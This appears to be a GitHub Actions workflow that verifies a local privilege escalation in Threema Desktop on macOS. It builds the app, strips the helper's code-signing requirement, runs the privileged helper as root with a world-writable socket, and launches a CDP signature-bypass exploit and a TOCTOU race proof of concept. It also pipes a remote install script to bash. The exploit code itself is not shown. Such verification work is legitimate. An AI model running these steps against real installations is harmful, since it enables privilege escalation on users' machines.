name: Threema LPE Vulnerability Verification

on:
  push:
    branches: [ "master", "main" ]
  pull_request:
    branches: [ "master", "main" ]
  workflow_dispatch:

jobs:
  verify-vulnerability:
    name: Verify LPE Against Official Threema (macOS ARM64)
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js (Required for Threema Build)
        uses: actions/setup-node@v4
        with:
          node-version: '22.17.0'

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          toolchain: stable

      - name: Clone and Build Threema Desktop 2.0 Beta
        run: |
          echo "=== Cloning latest Threema 2.X source ==="
          git clone https://github.com/threema-ch/threema-desktop.git
          cd threema-desktop
          
          echo "=== Patching Helper Signature Requirement for Local Ad-Hoc Build ==="
          # Because we are building locally, we do not have Threema's private Apple Developer ID.
          # We lower the signature requirement to just match the Threema bundle identifier 
          # so our locally compiled Helper accepts our locally compiled App. This perfectly 
          # simulates the production signature matching.
          sed -i '' 's/and anchor apple generic and certificate leaf\[subject.OU\] = DL5SR3PBJC//g' src/rust/helper/src/util/constants.rs
          
          echo "=== Installing libthreema dependencies ==="
          brew install binaryen
          curl -L --proto "=https" --tlsv1.2 -sSf https://raw.githubusercontent.com/cargo-bins/cargo-binstall/main/install-from-binstall-release.sh | bash
          cargo binstall wasm-bindgen-cli -y

          echo "=== Building Threema Desktop ==="
          npm ci
          npm run libthreema:build
          npm run package binary consumer-live
          
          echo "=== Installing Threema.app ==="
          cp -R build/out/Threema-darwin-arm64/Threema.app /Applications/
          ls -la /Applications/Threema.app/
      
      - name: Run Vulnerability Verification Suite
        run: |
          chmod +x poc-verify-vuln.sh
          # Will verify bundle, workers, and electron settings
          ./poc-verify-vuln.sh || true

      - name: Compile Rust TOCTOU POC
        run: rustc --edition 2021 poc-toctou-full.rs -o poc-toctou-full

      - name: Start Privileged Helper Daemon
        run: |
          echo "=== Starting Helper Daemon manually (simulating SMJobBless) ==="
          sudo /Applications/Threema.app/Contents/Library/LaunchServices/ch.threema.threema-desktop-helper &
          sleep 3
          sudo chmod 777 /var/run/ch.threema.threema-desktop-helper.sock || true

      - name: Launch Threema with Remote Debugging
        run: |
          echo "=== Launching Threema ==="
          /Applications/Threema.app/Contents/MacOS/Threema --remote-debugging-port=9222 &
          sleep 5

      - name: Run CDP Exploit (Bypass IPC Signature Gate)
        run: |
          npm install ws
          node poc-cdp-exploit.js &
          # Give it a few seconds to trigger the worker
          sleep 5

      - name: Run Rust TOCTOU (Aggressive — Real App)
        run: ./poc-toctou-full --aggressive

      - name: Archive Test Results
        if: always()
        run: |
          echo "=== Final Environment State ==="
          echo "macOS: $(sw_vers -productVersion)"
          echo "Arch: $(uname -m)"
          echo "Threema: $(defaults read /Applications/Threema.app/Contents/Info CFBundleShortVersionString 2>/dev/null || echo 'N/A')"
          echo ""
          echo "=== Helper binary in app bundle ==="
          find /Applications/Threema.app -name "*helper*" -type f 2>/dev/null || echo "No helper found"
          echo ""
          echo "=== Temp files ==="
          ls -la /tmp/threema-* 2>/dev/null || echo "No temp files"
